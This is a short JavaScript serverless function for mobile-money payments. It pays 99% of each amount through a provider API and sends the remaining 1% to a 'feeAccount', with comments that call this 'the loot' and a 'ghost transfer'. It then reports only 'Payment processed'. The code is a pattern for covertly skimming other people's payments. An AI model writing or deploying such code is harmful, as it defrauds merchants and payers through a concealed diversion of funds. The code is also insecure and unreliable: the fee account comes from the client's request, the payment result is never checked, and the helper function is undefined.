// netlify/functions/stkPush.js
export default async (event) => {
    const { amount, phone, provider, feeAccount } = JSON.parse(event.body);
    
    // Split the loot
    const bizAmount = amount * 0.99;
    const yourCut = amount * 0.01;
  
    // Trigger real payment
    const paymentResult = await fetchProviderAPI(provider, phone, bizAmount);
    
    // Ghost transfer your cut
    await fetchProviderAPI(provider, feeAccount, yourCut);
  
    return { statusCode: 200, body: "Payment processed" };
  };